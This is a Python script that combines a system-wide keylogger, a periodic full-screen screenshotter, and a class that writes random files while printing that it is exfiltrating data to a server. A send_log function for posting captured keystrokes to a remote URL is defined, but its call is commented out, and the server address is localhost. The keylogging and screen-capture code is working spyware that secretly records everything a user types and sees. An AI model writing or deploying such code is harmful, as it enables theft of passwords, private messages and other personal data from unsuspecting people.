import keyboard
import datetime
from threading import Timer
import requests
from PIL import ImageGrab
from threading import Thread
import os
import random

SERVER_IP = "127.0.0.1"
SERVER_URL = 'https://'+SERVER_IP+'/api/logger'
    
def send_log(log):
    try:
        requests.post(SERVER_URL, data={'log': log})
    except Exception as e:
        print(e)

class Keylogger:

    def __init__(self, interval):
        self.log = ""
        self.interval = interval
        self.start_dt = datetime.datetime.now()
        self.end_dt = datetime.datetime.now()
    
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    
    def update_filename(self):
        start_date_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "-")
        end_date_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "-")
        self.filename = f"./keylogs/keylog-{start_date_str}__{end_date_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")


    def report(self):
        if self.log:
            self.end_dt = datetime.datetime.now()
            self.update_filename()
            self.report_to_file()
            print("Keylogger report at: ", self.filename)
            self.start_dt = datetime.datetime.now()
            

        #report to server
        # send_log(self.log)
        # print("Keylogger report sent to server")


        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print("Keylogger started...")
        keyboard.wait()

class Screenshotter:

    def __init__(self, interval):
        self.interval = interval
        self.screenshot_count = 0

    def screenshot(self):
        pic = ImageGrab.grab()

        filename = f"./screenshots/screenshot-{self.screenshot_count}-{datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')}.png"
        pic.save(filename)
        print(f"[+] Screenshot saved: {filename}")
        self.screenshot_count += 1

        timer = Timer(interval=self.interval, function=self.screenshot)
        timer.daemon = True
        timer.start()

    def start(self):
        print("Screenshotter started...")
        self.screenshot()

class Exfiltrator:

    def __init__(self, interval):
        self.interval = interval

    def exfiltrate(self):
        # exfiltrate data to server
        print("Generating random file...")
        #size between 10 and 100
        size = random.randint(10, 100)
        self.generate_random_file("./files/random_file", size)
        print("Exfiltrating data to server...")
        timer = Timer(interval=self.interval, function=self.exfiltrate)
        timer.daemon = True
        timer.start()

    def generate_random_file(self, filename, size_in_mb):
        size_in_bytes = size_in_mb * 1024 * 1024

        with open(filename, "wb") as f:
            f.write(os.urandom(size_in_bytes))

    def delete_random_file(self, filename):
        try:
            os.remove(filename)
        except:
            pass
        print("Random file deleted...")

    def delete(self):
        print("Deleting random file...")
        self.delete_random_file("./files/random_file") 
        timer = Timer(interval=(self.interval/2), function=self.delete)
        timer.daemon = True
        timer.start()

    def start(self):
        print("Exfiltrator started...")
        self.exfiltrate()
        # self.delete()

if __name__ == "__main__":
    keylogger = Keylogger(interval=15)
    screenshotter = Screenshotter(interval=30)
    exfiltrator = Exfiltrator(interval=10)

    # Create threads for keylogger and screenshotter
    keylogger_thread = Thread(target=keylogger.start)
    print("Keylogger thread created...")
    screenshotter_thread = Thread(target=screenshotter.start)
    print("Screenshotter thread created...")
    exfiltrator_thread = Thread(target=exfiltrator.start)
    print("Exfiltrator thread created...")

    # Start threads
    keylogger_thread.start()
    screenshotter_thread.start()
    exfiltrator_thread.start()

    keylogger_thread.join()
    screenshotter_thread.join()
    exfiltrator_thread.join()

    print("Program started...")